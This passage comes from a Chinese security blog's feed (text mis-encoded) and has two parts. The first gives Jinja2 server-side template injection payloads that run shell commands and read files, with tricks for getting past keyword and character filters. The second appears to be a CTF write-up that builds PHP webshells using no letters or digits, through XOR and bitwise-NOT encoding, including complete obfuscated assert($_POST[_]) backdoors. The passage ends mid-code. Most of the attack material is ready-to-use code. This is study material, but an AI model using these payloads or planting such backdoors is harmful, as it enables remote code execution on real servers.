title="4.subprocess"></a>4.subprocess</h3><p>è¿™ä¸ªæ¨¡å—åŸæœ¬åœ¨python2ä¸­æ˜¯<code>commands</code>ï¼Œåœ¨pythonä¸­è¢«æ›¿æ¢ä¸º<code>subprocess</code>ã€‚</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#125;.__class__.__bases__[0].__subclasses__()[139].__init__.__globals__[&#39;__builtins__&#39;][&#39;__import__&#39;](&#39;subprocess&#39;).getstatusoutput(&#39;ls&#39;)</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#125;.__class__.__bases__[0].__subclasses__()[139].__init__.__globals__[&#39;__builtins__&#39;][&#39;__import__&#39;](&#39;os&#39;).system(&#39;ls&#39;)</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#125;.__class__.__bases__[0].__subclasses__()[139].__init__.__globals__[&#39;__builtins__&#39;][&#39;__import__&#39;](&#39;os&#39;).popen(&#39;ls&#39;).read()</span><br></pre></td></tr></table></figure><h1 id="Bypass"><a href="#Bypass" class="headerlink" title="Bypass"></a>Bypass</h1><p>ç°åœ¨å¾ˆå¤šæ¨¡æ¿æ³¨å…¥éƒ½æœ‰é™åˆ¶ï¼Œæ¯”å¦‚é™åˆ¶è¾“å…¥æŸäº›å…³é”®å­—ï¼Œæˆ–è€…å¹²è„†ç›´æ¥é™åˆ¶è¾“å…¥æŸäº›å­—ç¬¦ã€‚ä¸‹é¢æ€»ç»“äº†ä¸€äº›ç»•è¿‡çš„æ–¹æ³•ã€‚</p><h2 id="è¿‡æ»¤"><a href="#è¿‡æ»¤" class="headerlink" title="è¿‡æ»¤[]"></a>è¿‡æ»¤[]</h2><p>ä½¿ç”¨getitem()æˆ–è€…pop()ç»•è¿‡ï¼Œå¦‚ï¼š<code>&quot;&quot;.__class__.__bases__[0]</code><br>ç»•è¿‡åï¼š<code>&quot;&quot;.__class__.__bases__.getitem(0)</code></p><p>è¯»æ–‡ä»¶ï¼š</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&quot;&quot;.__class__.__base__.__subclasses__().pop(-1).__init__.__globals__.pop(&#39;__builtins__&#39;).pop(&#39;open&#39;)(&#39;test.txt&#39;).read()</span><br></pre></td></tr></table></figure><p>æ‰§è¡Œå‘½ä»¤ï¼š</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#39;&#39;.__class__.__base__.__subclasses__().pop(132).__init__.__globals__.pop(&#39;popen&#39;)(&#39;ls&#39;).read()</span><br></pre></td></tr></table></figure><h2 id="è¿‡æ»¤å¼•å·"><a href="#è¿‡æ»¤å¼•å·" class="headerlink" title="è¿‡æ»¤å¼•å·"></a>è¿‡æ»¤å¼•å·</h2><p>request.args æ˜¯ flask ä¸­çš„ä¸€ä¸ªå±æ€§ï¼Œä¸ºè¿”å›è¯·æ±‚çš„å‚æ•°ï¼Œè¿™é‡ŒæŠŠ<code>popen</code>å’Œ<code>cmd</code>å½“ä½œå˜é‡åï¼Œå°†å€¼ä¼ è¿›æ¥ï¼Œè¿›è€Œç»•è¿‡äº†å¼•å·çš„è¿‡æ»¤ã€‚</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;().__class__.__base__.__subclasses__().pop(117).__init__.__globals__[request.args.popen](request.args.cmd).read()&#125;&#125;&amp;popen&#x3D;popen&amp;cmd&#x3D;whoami</span><br></pre></td></tr></table></figure><h2 id="è¿‡æ»¤ä¸‹åˆ’çº¿"><a href="#è¿‡æ»¤ä¸‹åˆ’çº¿" class="headerlink" title="è¿‡æ»¤ä¸‹åˆ’çº¿"></a>è¿‡æ»¤ä¸‹åˆ’çº¿</h2><p>ä¹Ÿæ˜¯åŠ¨æ€ä¼ å‚ç»•è¿‡</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;&quot;&quot;[request.args.class][request.args.base][request.args.subclasses]()[117][request.args.init][request.args.globals][request.args.popen](request.args.cmd).read()&#125;&#125;&amp;class&#x3D;__class__&amp;base&#x3D;__base__&amp;subclasses&#x3D;__subclasses__&amp;init&#x3D;__init__&amp;globals&#x3D;__globals__&amp;popen&#x3D;popen&amp;cmd&#x3D;cat &#x2F;flag</span><br></pre></td></tr></table></figure><h2 id="è¿‡æ»¤å…³é”®å­—"><a href="#è¿‡æ»¤å…³é”®å­—" class="headerlink" title="è¿‡æ»¤å…³é”®å­—"></a>è¿‡æ»¤å…³é”®å­—</h2><p>æ¯”å¦‚è¿‡æ»¤æ‰<code>subclasses</code>ï¼š</p><h3 id="ä½¿ç”¨request-argsåŠ¨æ€ä¼ å‚ç»•è¿‡"><a href="#ä½¿ç”¨request-argsåŠ¨æ€ä¼ å‚ç»•è¿‡" class="headerlink" title="ä½¿ç”¨request.argsåŠ¨æ€ä¼ å‚ç»•è¿‡"></a>ä½¿ç”¨<code>request.args</code>åŠ¨æ€ä¼ å‚ç»•è¿‡</h3><p>æ¯”å¦‚è¿‡æ»¤æ‰<code>subclasses</code>ï¼š</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&quot;&quot;.__class__.__bases__[0][request.args.a]()[117].__init__.__globals__[&#39;__builtins__&#39;][&#39;eval&#39;](&#39;__import__(&quot;os&quot;).popen(&quot;ls&quot;).read()&#39;)&#125;&#125;&amp;a&#x3D;__subclasses__</span><br><span class="line"># cookieä¼ å€¼</span><br><span class="line">&quot;&quot;.__class__.__bases__[0][request.cookies[&#39;var&#39;]]()[117].__init__.__globals__[&#39;__builtins__&#39;][&#39;eval&#39;](&#39;__import__(&quot;os&quot;).popen(&quot;ls&quot;).read()&#39;)</span><br></pre></td></tr></table></figure><h3 id="ä½¿ç”¨base64ç¼–ç ç»•è¿‡"><a href="#ä½¿ç”¨base64ç¼–ç ç»•è¿‡" class="headerlink" title="ä½¿ç”¨base64ç¼–ç ç»•è¿‡"></a>ä½¿ç”¨base64ç¼–ç ç»•è¿‡</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"># ç¼–ç å‰</span><br><span class="line">().__class__.__bases__[0].__subclasses__()[169].__init__.__globals__.__builtins__[&#39;eval&#39;](&quot;__import__(&#39;os&#39;).popen(&#39;ls&#39;).read()&quot;)</span><br><span class="line"># ç¼–ç å</span><br><span class="line">().__class__.__bases__[0].__subclasses__()[169].__init__.__globals__.__builtins__[&#39;ZXZhbA&#x3D;&#x3D;&#39;.decode(&#39;base64&#39;)](&quot;X19pbXBvcnRfXygnb3MnKS5wb3BlbignbHMnKS5yZWFkKCk&#x3D;&quot;.decode(&#39;base64&#39;))</span><br></pre></td></tr></table></figure><h3 id="ä½¿ç”¨å­—ç¬¦ä¸²æ‹¼æ¥ç»•è¿‡"><a href="#ä½¿ç”¨å­—ç¬¦ä¸²æ‹¼æ¥ç»•è¿‡" class="headerlink" title="ä½¿ç”¨å­—ç¬¦ä¸²æ‹¼æ¥ç»•è¿‡"></a>ä½¿ç”¨å­—ç¬¦ä¸²æ‹¼æ¥ç»•è¿‡</h3><p>ä½¿ç”¨åŠ å·æ¥æ‹¼æ¥å­—ç¬¦ä¸²ï¼Œ<code> = </code>ã€‚</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&quot;&quot;.__class__.__base__[&#39;__subcl&#39;+&#39;asses__&#39;]()[117].__init__.__globals__[&#39;popen&#39;](&#39;ls&#39;).read()</span><br></pre></td></tr></table></figure><p>ä½¿ç”¨joinè¿æ¥å­—ç¬¦ä¸²ï¼Œ</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[].__getattribute__([&#39;__c&#39;,&#39;lass__&#39;]|join).__base__.__subclasses__()[117].__init__.__globals__[&#39;popen&#39;](&#39;ls&#39;).read()</span><br></pre></td></tr></table></figure><h2 id="è¿‡æ»¤ç‚¹å·"><a href="#è¿‡æ»¤ç‚¹å·" class="headerlink" title="è¿‡æ»¤ç‚¹å·"></a>è¿‡æ»¤ç‚¹å·</h2><p>jinja2æ¨¡æ¿ä¸­æœ‰å¾ˆå¤šæœ‰ç”¨çš„å†…ç½®è¿‡æ»¤å™¨ï¼Œè¿™é‡Œä½¿ç”¨çš„æ˜¯<code>attr</code>å’Œ<code>join</code>è¿™ä¸¤ä¸ªè¿‡æ»¤å™¨ã€‚</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#96;&#96;&#96;&#123;&#123;request|attr([&quot;_&quot;*2,&quot;class&quot;,&quot;_&quot;*2]|join)&#125;&#125;&#96;&#96;&#96;å°±ç›¸å½“äº&#96;&#96;&#96;&#123;&#123;request.__class__&#125;&#125;</span><br></pre></td></tr></table></figure><p>è¿˜æœ‰å…³äºè¿‡æ»¤çš„æ–¹å¼ï¼š</p><blockquote><p><a href="https://github.red/cybrics-2020-web-writeup/">https://github.red/cybrics-2020-web-writeup/</a></p></blockquote><h1 id="ä½¿ç”¨å·¥å…·"><a href="#ä½¿ç”¨å·¥å…·" class="headerlink" title="ä½¿ç”¨å·¥å…·"></a>ä½¿ç”¨å·¥å…·</h1><h2 id="Tplmap"><a href="#Tplmap" class="headerlink" title="Tplmap"></a>Tplmap</h2><blockquote><p>æœåŠ¡å™¨ç«¯æ¨¡æ¿æ³¨å…¥å’Œä»£ç æ³¨å…¥æ£€æµ‹ä¸å¼€å‘å·¥å…·</p></blockquote><p>ä¸€ä¸ª python å·¥å…·ï¼Œå¯ä»¥é€šè¿‡ä½¿ç”¨æ²™ç®±è½¬ä¹‰æŠ€æœ¯æ‰¾åˆ°ä»£ç æ³¨å…¥å’ŒæœåŠ¡å™¨ç«¯æ¨¡æ¿æ³¨å…¥ï¼ˆSSTIï¼‰æ¼æ´ã€‚è¯¥å·¥å…·èƒ½å¤Ÿåœ¨è®¸å¤šæ¨¡æ¿å¼•æ“ä¸­åˆ©ç”¨ SSTI æ¥è®¿é—®ç›®æ ‡æ–‡ä»¶æˆ–æ“ä½œç³»ç»Ÿã€‚ä¸€äº›å—æ”¯æŒçš„æ¨¡æ¿å¼•æ“åŒ…æ‹¬ PHPã€Rubyã€JaveScriptã€Pythonã€ERBã€Jinja2 å’Œ Tornadoã€‚è¯¥å·¥å…·å¯ä»¥æ‰§è¡Œå¯¹è¿™äº›æ¨¡æ¿å¼•æ“çš„ç›²æ³¨å…¥ï¼Œå¹¶å…·æœ‰æ‰§è¡Œè¿œç¨‹å‘½ä»¤çš„èƒ½åŠ›ã€‚</p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;[TOC]&lt;/p&gt;
&lt;h1 id=&quot;sstiæ€è·¯&quot;&gt;&lt;a href=&quot;#sstiæ€è·¯&quot; class=&quot;headerlink&quot; title=&quot;sstiæ€è·¯&quot;&gt;&lt;/a&gt;sstiæ€è·¯&lt;/h1&gt;&lt;p&gt;æœåŠ¡ç«¯æ¨¡æ¿æ³¨å…¥å’Œå¸¸è§Webæ³¨å…¥çš„æˆå› ä¸€æ ·ï¼Œä¹Ÿæ˜¯æœåŠ¡ç«¯æ¥æ”¶äº†ç”¨æˆ·çš„è¾“å…¥ï¼Œå°†å…¶ä½œä¸º Web åº”ç”¨æ¨¡æ¿å†…å®¹çš„ä¸€éƒ¨åˆ†ï¼Œ
    
    </summary>
    
    
      <category term="python" scheme="http://yoursite.com/categories/python/"/>
    
    
      <category term="ssti" scheme="http://yoursite.com/tags/ssti/"/>
    
  </entry>
  
  <entry>
    <title>æ— å­—æ¯æ•°å­—æ„é€ webshellçš„å­¦ä¹ </title>
    <link href="http://yoursite.com/2020/07/23/webshell/"/>
    <id>http://yoursite.com/2020/07/23/webshell/</id>
    <published>2020-07-23T11:37:52.000Z</published>
    <updated>2020-08-02T14:01:54.326Z</updated>
    
    <content type="html"><![CDATA[<p>[toc]</p><h1 id="å‰è¨€"><a href="#å‰è¨€" class="headerlink" title="å‰è¨€"></a>å‰è¨€</h1><p>æœ€è¿‘ç¢°åˆ°ä¸€é“é¢˜ï¼Œä¾¿å­¦ä¹ äº†ä¸€ä¸‹ç›¸å…³æ— å­—æ¯æ•°å­—æ„é€ webshellçš„çŸ¥è¯†ã€‚é¢˜ç›®å¦‚ä¸‹ï¼š</p><a id="more"></a><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">include &#39;flag.php&#39;;</span><br><span class="line">if(isset($_GET[&#39;code&#39;]))&#123;</span><br><span class="line">    $code &#x3D; $_GET[&#39;code&#39;];</span><br><span class="line">    if(strlen($code)&gt;40)&#123;</span><br><span class="line">        die(&quot;Long.&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">    if(preg_match(&quot;&#x2F;[A-Za-z0-9]+&#x2F;&quot;,$code))&#123;</span><br><span class="line">        die(&quot;NO.&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">    @eval($code);</span><br><span class="line">&#125;else&#123;</span><br><span class="line">    highlight_file(__FILE__);</span><br><span class="line">&#125;</span><br><span class="line">&#x2F;&#x2F;$hint &#x3D;  &quot;php function getFlag() to get flag&quot;;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p>é¢˜ç›®ä¸­å¯ä»¥çœ‹åˆ°å­—æ¯å’Œæ•°å­—æ˜¯æ²¡æ³•ä½¿ç”¨çš„ï¼Œè€Œä¸”payloadé•¿åº¦å¿…é¡»åœ¨40ä»¥å†…ã€‚æˆ‘ä»¬éœ€è¦ç»•è¿‡æ­£åˆ™è¿‡æ»¤ï¼Œåˆ©ç”¨ä¸å¯è§å­—ç¬¦æˆ–è€…æ­£åˆ™è¡¨è¾¾å¼é—æ¼çš„å­—ç¬¦é€šè¿‡å„ç§å˜æ¢æ¥æ„é€ å‡ºa-zä¸­çš„ä»»æ„ä¸€ä¸ªå­—ç¬¦ï¼Œå¹¶ä¸”é•¿åº¦å°äº40ï¼Œç„¶åå†åˆ©ç”¨phpå…è®¸åŠ¨æ€å‡½æ•°æ‰§è¡Œçš„ç‰¹ç‚¹ï¼Œæ‹¼æ¥å‡ºä¸€ä¸ªå‡½æ•°åï¼Œç„¶ååŠ¨æ€æ‰§è¡Œä¹‹å³å¯ã€‚<br>é‚£ä¹ˆï¼Œæˆ‘ä»¬ç°åœ¨çš„é—®é¢˜å°±æ˜¯å¦‚ä½•é€šè¿‡å„ç§å˜æ¢ï¼Œæ˜¯çš„æˆ‘ä»¬èƒ½å¤ŸæˆåŠŸæ„é€ å‡ºæ‰€éœ€çš„å‡½æ•°ï¼Œç„¶åæ‹¿åˆ°webshellã€‚</p><h1 id="å‰ç½®çŸ¥è¯†"><a href="#å‰ç½®çŸ¥è¯†" class="headerlink" title="å‰ç½®çŸ¥è¯†"></a>å‰ç½®çŸ¥è¯†</h1><h2 id="php5å’Œ7çš„å·®å¼‚ï¼š"><a href="#php5å’Œ7çš„å·®å¼‚ï¼š" class="headerlink" title="php5å’Œ7çš„å·®å¼‚ï¼š"></a>php5å’Œ7çš„å·®å¼‚ï¼š</h2><p>php5ä¸­assertæ˜¯ä¸€ä¸ªå‡½æ•°ï¼Œæˆ‘ä»¬å¯ä»¥é€šè¿‡$f=â€™assertâ€™;$f(â€¦);è¿™æ ·çš„æ–¹æ³•æ¥åŠ¨æ€æ‰§è¡Œä»»æ„ä»£ç ã€‚</p><p>ä½†php7ä¸­ï¼Œassertä¸å†æ˜¯å‡½æ•°ï¼Œå˜æˆäº†ä¸€ä¸ªè¯­è¨€ç»“æ„ï¼ˆç±»ä¼¼evalï¼‰ï¼Œä¸èƒ½å†ä½œä¸ºå‡½æ•°ååŠ¨æ€æ‰§è¡Œä»£ç ï¼Œæ‰€ä»¥åˆ©ç”¨èµ·æ¥ç¨å¾®å¤æ‚ä¸€ç‚¹ã€‚ä½†ä¹Ÿæ— éœ€è¿‡äºæ‹…å¿ƒï¼Œæ¯”å¦‚æˆ‘ä»¬åˆ©ç”¨file_put_contentså‡½æ•°ï¼ŒåŒæ ·å¯ä»¥ç”¨æ¥getshellã€‚</p><p>PHP7å‰æ˜¯ä¸å…è®¸ç”¨($a)();è¿™æ ·çš„æ–¹æ³•æ¥æ‰§è¡ŒåŠ¨æ€å‡½æ•°çš„ï¼Œä½†PHP7ä¸­å¢åŠ äº†å¯¹æ­¤çš„æ”¯æŒã€‚æ‰€ä»¥ï¼Œæˆ‘ä»¬å¯ä»¥é€šè¿‡(â€˜phpinfoâ€™)();æ¥æ‰§è¡Œå‡½æ•°ï¼Œç¬¬ä¸€ä¸ªæ‹¬å·ä¸­å¯ä»¥æ˜¯ä»»æ„PHPè¡¨è¾¾å¼ã€‚</p><h2 id="phpç‰¹æ€§"><a href="#phpç‰¹æ€§" class="headerlink" title="phpç‰¹æ€§"></a>phpç‰¹æ€§</h2><p>(1)ä»£ç ä¸­æ²¡æœ‰å¼•å·çš„å­—ç¬¦éƒ½è‡ªåŠ¨ä½œä¸ºå­—ç¬¦ä¸²<br>    æˆ‘çŒœè¿™ä¹Ÿæ˜¯ä¸ºä»€ä¹ˆä¼ é©¬çš„æ—¶å€™<code>$_GET[&#39;cmd&#39;]</code>å’Œ<code>$_GET[cmd]</code>éƒ½å¯ä»¥</p><p>(2)Asciiç å¤§äº 0x7F çš„å­—ç¬¦éƒ½ä¼šè¢«å½“ä½œå­—ç¬¦ä¸²</p><p>(3)php åœ¨è·å– HTTP GET å‚æ•°çš„æ—¶å€™é»˜è®¤æ˜¯è·å¾—åˆ°äº†å­—ç¬¦ä¸²ç±»å‹</p><p>(4)åœ¨å­—ç¬¦ä¸²çš„å˜é‡çš„åé¢è·Ÿä¸Š{}å¤§æ‹¬å·æˆ–è€…ä¸­æ‹¬å·[]ï¼Œé‡Œé¢å¡«å†™äº†æ•°å­—ï¼Œè¿™é‡Œæ˜¯æŠŠå­—ç¬¦ä¸²å˜é‡å½“æˆæ•°ç»„å¤„ç†<br>æ‰€ä»¥æœ‰<code>${_GET}{cmd}</code></p><h2 id="ä¸ä½¿ç”¨æ•°å­—å­—æ¯æ„é€ æ•°å­—"><a href="#ä¸ä½¿ç”¨æ•°å­—å­—æ¯æ„é€ æ•°å­—" class="headerlink" title="ä¸ä½¿ç”¨æ•°å­—å­—æ¯æ„é€ æ•°å­—"></a>ä¸ä½¿ç”¨æ•°å­—å­—æ¯æ„é€ æ•°å­—</h2><p>åˆ©ç”¨äº†phpå¼±ç±»å‹çš„ç‰¹æ€§ï¼Œtrueçš„å€¼ä¸º1ï¼Œæ‰€ä»¥true+true==2ã€‚</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$__&#x3D;(&#39;&gt;&#39;&gt;&#39;&lt;&#39;)+(&#39;&gt;&#39;&gt;&#39;&lt;&#39;);  &#x2F;&#x2F;$__&#x3D;2</span><br><span class="line">$_&#x3D;$__&#x2F;$__;  &#x2F;&#x2F;$_&#x3D;1</span><br></pre></td></tr></table></figure><p>åœ¨phpä¸­æœªå®šä¹‰çš„å˜é‡é»˜è®¤å€¼ä¸ºnullï¼Œnull==false==0ï¼Œæ‰€ä»¥æˆ‘ä»¬èƒ½å¤Ÿåœ¨ä¸ä½¿ç”¨ä»»ä½•æ•°å­—çš„æƒ…å†µä¸‹é€šè¿‡å¯¹æœªå®šä¹‰å˜é‡çš„è‡ªå¢æ“ä½œæ¥å¾—åˆ°ä¸€ä¸ªæ•°å­—ã€‚</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$_++; </span><br><span class="line">&#x2F;&#x2F;$_&#x3D;1</span><br></pre></td></tr></table></figure><p>ä¹Ÿå¯ä»¥ç”¨!æ“ä½œç¬¦æ¥è¿›è¡Œå¸ƒå°”ç±»å‹çš„è½¬æ¢ã€‚</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">echo !$_;</span><br><span class="line">&#x2F;&#x2F;è¿™ä¸ªä»£ç å°†è¾“å‡º1</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><h1 id="æ„é€ webshell"><a href="#æ„é€ webshell" class="headerlink" title="æ„é€ webshell"></a>æ„é€ webshell</h1><p>æ„é€ æ— å­—æ¯æ•°å­—webshellä¸€èˆ¬ç”¨åˆ°ä¸‹é¢è¿™å‡ ç§æ–¹æ³•ï¼š</p><h2 id="å¼‚æˆ–"><a href="#å¼‚æˆ–" class="headerlink" title="å¼‚æˆ–"></a>å¼‚æˆ–</h2><p>åœ¨phpä¸­ï¼Œä¸¤ä¸ªå­—ç¬¦ä¸²æ‰§è¡Œå¼‚æˆ–æ“ä½œä»¥åï¼Œå¾—åˆ°çš„è¿˜æ˜¯ä¸€ä¸ªå­—ç¬¦ä¸²ã€‚æ‰€ä»¥ï¼Œæƒ³å¾—åˆ°a-zä¸­çš„æŸä¸ªå­—æ¯ï¼Œå°±æ‰¾åˆ°æŸä¸¤ä¸ªéå­—æ¯ã€æ•°å­—çš„å­—ç¬¦ï¼Œä»–ä»¬å¼‚æˆ–çš„ç»“æœæ˜¯è¿™ä¸ªå­—æ¯å³å¯ã€‚</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">    echo &quot;A&quot;^&quot;?&quot;;</span><br><span class="line">?&gt;</span><br><span class="line"></span><br><span class="line">è¿è¡Œç»“æœï¼š~</span><br></pre></td></tr></table></figure><p>è¾“å‡ºçš„ç»“æœæ˜¯å­—ç¬¦â€~â€ï¼Œè¿™æ˜¯å› ä¸ºä»£ç å¯¹å­—ç¬¦â€Aâ€å’Œå­—ç¬¦â€?â€è¿›è¡Œäº†å¼‚æˆ–æ“ä½œã€‚åœ¨PHPä¸­ä¸¤ä¸ªå˜é‡è¿›è¡Œå¼‚æˆ–æ—¶ï¼Œä¼šå…ˆå°†å­—ç¬¦ä¸²è½¬æ¢æˆASCIIå€¼ï¼Œå†å°†ASCIIå€¼è½¬æ¢æˆäºŒè¿›åˆ¶å†è¿›è¡Œå¼‚æˆ–ï¼Œå¼‚æˆ–å®Œåˆå°†ç»“æœä»äºŒè¿›åˆ¶è½¬æ¢æˆASCIIå€¼ï¼Œå†è½¬æ¢æˆå­—ç¬¦ä¸²ã€‚<br>ä¾‹å¦‚ä¸‹é¢è¿™ä¸ªphpåé—¨ï¼š</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$_&#x3D;(&#39;:&#39;^&#39;[&#39;).(&#39;(&#39;^&#39;[&#39;).(&#39;(&#39;^&#39;[&#39;).(&#39;&gt;&#39;^&#39;[&#39;).(&#39;)&#39;^&#39;[&#39;).(&#39;&#x2F;&#39;^&#39;[&#39;); &#x2F;&#x2F; $_&#x3D;&#39;assert&#39;;</span><br><span class="line">$__&#x3D;&#39;_&#39;.(&#39;+&#39;^&#39;&#123;&#39;).(&#39;&#x2F;&#39;^&#39;&#96;&#39;).(&#39;(&#39;^&#39;&#123;&#39;).(&#39;&#x2F;&#39;^&#39;&#123;&#39;); &#x2F;&#x2F; $__&#x3D;&#39;_POST&#39;;</span><br><span class="line">$___&#x3D;$$__;</span><br><span class="line">$_($___[_]); &#x2F;&#x2F; assert($_POST[_]);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p>æ‰§è¡Œç»“æœå¦‚ä¸‹ï¼š</p><p><img src="/images/20200723230637.png" alt=""></p><h2 id="å–å"><a href="#å–å" class="headerlink" title="å–å"></a>å–å</h2><p>æ¥çœ‹ä¸€ä¸ªæ±‰å­—â€å’Œâ€</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; print(&quot;å’Œ&quot;.encode(&#39;utf8&#39;))</span><br><span class="line">b&#39;\xe5\x92\x8c&#39;</span><br><span class="line">&gt;&gt;&gt; print(&quot;å’Œ&quot;.encode(&#39;utf8&#39;)[2])</span><br><span class="line">140</span><br><span class="line">&gt;&gt;&gt; print(~&quot;å’Œ&quot;.encode(&#39;utf8&#39;)[2])</span><br><span class="line">-141</span><br></pre></td></tr></table></figure><p>â€œå’Œâ€çš„ç¬¬ä¸‰ä¸ªå­—èŠ‚çš„å€¼ä¸º140[0x8c]ï¼Œå–åçš„å€¼ä¸º-141ã€‚<br>è´Ÿæ•°ç”¨åå…­è¿›åˆ¶è¡¨ç¤ºï¼Œé€šå¸¸ç”¨çš„æ˜¯è¡¥ç çš„æ–¹å¼è¡¨ç¤ºã€‚è´Ÿæ•°çš„è¡¥ç æ˜¯å®ƒæœ¬èº«çš„å€¼æ¯ä½æ±‚å,æœ€åå†åŠ ä¸€ã€‚141çš„16è¿›åˆ¶ä¸º0xff73ï¼Œphpä¸­chr(0xff73)==115ï¼Œ115å°±æ˜¯sçš„ASCIIå€¼ã€‚<br>å› æ­¤</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$_&#x3D;&quot;å’Œ&quot;;</span><br><span class="line">print(~($_&#123;2&#125;));</span><br><span class="line">print(~&quot;\x8c&quot;);</span><br><span class="line">?&gt;</span><br><span class="line">ä¸¤ä¸ªå†™æ³•æ€§è´¨ä¸€æ ·</span><br><span class="line">ç»“æœä¼šè¾“å‡ºï¼š ss</span><br></pre></td></tr></table></figure><p>pyè„šæœ¬ï¼š</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">def get(shell):</span><br><span class="line">     hexbit&#x3D;&#39;&#39;.join(map(lambda x: hex(~(-(256-ord(x)))),shell))</span><br><span class="line">     print(hexbit)</span><br><span class="line"></span><br><span class="line">get(&#39;phpinfo&#39;)</span><br><span class="line">#0x8f0x970x8f0x960x910x990x90</span><br></pre></td></tr></table></figure><p>ç›´æ¥è´´å‡ºpç¥çš„webshellå§</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$__&#x3D;(&#39;&gt;&#39;&gt;&#39;&lt;&#39;)+(&#39;&gt;&#39;&gt;&#39;&lt;&#39;);  &#x2F;&#x2F;$__&#x3D;2</span><br><span class="line">$_&#x3D;$__&#x2F;$__;  &#x2F;&#x2F;$_&#x3D;1</span><br><span class="line"></span><br><span class="line">$____&#x3D;&#39;&#39;;</span><br><span class="line">$___&#x3D;&quot;ç°&quot;;$____.&#x3D;~($___&#123;$_&#125;);$___&#x3D;&quot;å’Œ&quot;;$____.&#x3D;~($___&#123;$__&#125;);$___&#x3D;&quot;å’Œ&quot;;$____.&#x3D;~($___&#123;$__&#125;);$___&#x3D;&quot;çš„&quot;;$____.&#x3D;~($___&#123;$_&#125;);$___&#x3D;&quot;åŠ&quot;;$____.&#x3D;~($___&#123;$_&#125;);$___&#x3D;&quot;å§‹&quot;;$____.&#x3D;~($___&#123;$__&#125;);    &#x2F;&#x2F;assert</span><br><span class="line"></span><br><span class="line">$_____&#x3D;&#39;_&#39;;$___&#x3D;&quot;ä¿¯&quot;;$_____.&#x3D;~($___&#123;$__&#125;);$___&#x3D;&quot;ç°&quot;;$_____.&#x3D;~($___&#123;$__&#125;);$___&#x3D;&quot;æ¬¡&quot;;$_____.&#x3D;~($___&#123;$_&#125;);$___&#x3D;&quot;ç«™&quot;;$_____.&#x3D;~($___&#123;$_&#125;);   &#x2F;&#x2F;_POST</span><br><span class="line"></span><br><span class="line">$_&#x3D;$$_____;   &#x2F;&#x2F;$_POST</span><br><span 